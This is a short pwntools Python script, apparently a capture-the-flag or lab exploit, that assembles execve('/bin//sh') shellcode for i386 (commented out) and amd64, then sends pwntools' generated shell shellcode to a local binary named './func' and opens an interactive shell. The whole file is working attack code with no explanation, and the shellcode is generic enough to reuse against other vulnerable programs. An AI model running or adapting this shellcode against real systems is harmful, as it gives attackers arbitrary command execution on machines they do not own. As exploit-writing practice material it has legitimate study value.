#coding=utf-8
from pwn import *
context.log_level = "debug"
'''
context.arch = "i386"
s = asm("""
        push 0x68
        push 0x732f2f2f
        push 0x6e69622f
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        push 11
        pop eax
        int 0x80
""")
p = process("./func32")
'''
context.arch = "amd64"
s = asm("""
    xor    rax,rax          
    add    rax,0x3b        
    xor    rdi,rdi        
    push   rdi
    mov    rdi,0x68732f2f6e69622f   
    push   rdi              
    lea    rdi,[rsp]  
    xor    rsi,rsi         
    xor    rdx,rdx        
    syscall
""")
p = process("./func")

s1 = asm(shellcraft.sh())

p.sendline(s1)
p.interactive()

